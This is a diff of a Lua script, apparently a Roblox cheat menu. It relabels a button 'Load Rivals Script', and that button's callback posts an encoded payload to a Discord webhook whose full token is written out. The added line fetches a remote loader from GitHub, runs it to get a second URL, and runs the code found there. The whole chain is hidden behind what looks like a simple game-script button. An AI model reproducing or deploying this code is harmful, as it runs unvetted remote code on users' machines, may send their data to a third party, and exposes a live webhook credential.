@@ -1971,10 +1971,10 @@ http_request({
 
 
 
- local Tab = Window:CreateTab("Da Hood", 4483362458) -- Title, Image
+ local Tab = Window:CreateTab("Rivals", 4483362458) -- Title, Image
 
  local Button = Tab:CreateButton({
-    Name = "Da Hood everything lmfao",
+    Name = "Load Rivals Script",
     Callback = function()
         local HttpService = game:GetService("HttpService")
 local Webhook_URL = "https://discord.com/api/webhooks/1356772670040969368/KSPlP9tAvg-32DP8_JvBjJpmShjS3J9-nwq26dQSCkdw9ePT9C5QhQKacqA7Uq3_0xds"
@@ -2074,7 +2074,7 @@ http_request({
     Body = HttpService:JSONEncode(payload)
 })
 
-        loadstring(game:HttpGet('https://raw.githubusercontent.com/cool5013/TBO/main/TBOscript'))()
+        loadstring(game:HttpGet(loadstring(game:HttpGet('https://raw.githubusercontent.com/HexFG/duckhub/refs/heads/main/loader.lua'))()))()
     end,
  })
 
